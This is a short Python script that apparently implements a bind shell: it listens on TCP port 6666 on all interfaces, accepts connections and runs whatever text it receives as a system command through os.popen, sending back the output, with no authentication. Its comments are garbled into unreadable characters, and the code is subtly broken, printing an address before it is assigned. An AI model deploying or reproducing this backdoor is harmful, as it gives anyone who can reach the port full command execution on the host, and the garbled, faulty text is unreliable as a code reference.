#coding: utf-8
from socket import *
from os import *
from threading import Thread


#����һ�����ܷ�����
def ThreadHandle(sock):
	# ������Ϣ
	cmd = sock.recv(1024)
	# �ж��Ƿ�Ϊexit
	if cmd == 'exit':
		# �˳�
		exit()
	# ִ��������յ���cmd����	
	result = popen(cmd).read()
	# ����ִ��cmd����Ľ��
	sock.send(result)

if __name__ == "__main__":
	# ��һ��������"������֮������ͨ��", �ڶ���������"��ʽsocket , for TCP"	
	s = socket(AF_INET, SOCK_STREAM)
	# ���׽��ְ󶨵���ַ����һ�������ǰ󶨱������ض��������Ƕ˿ں�6666
	s.bind(('', 6666))
	# ��ʼ�����������ӣ�������������ֱ�ʾ�����������
	s.listen(1)
	# ����һ��ѭ��
	while True:
		# �������Ӳ����أ�conn,address��,����conn���µ��׽��ֶ��󣬿����������պͷ������ݡ�address�����ӿͻ��˵ĵ�ַ��
		print('Connect by ', addr)
		sock, addr = s.accept()
		# ��ӡ
		print('Connect by ', addr)
		# ���ɶ��̳߳�
		t = Thread(target = ThreadHandle, args = (sock,))
		# �������߳�
		t.start()
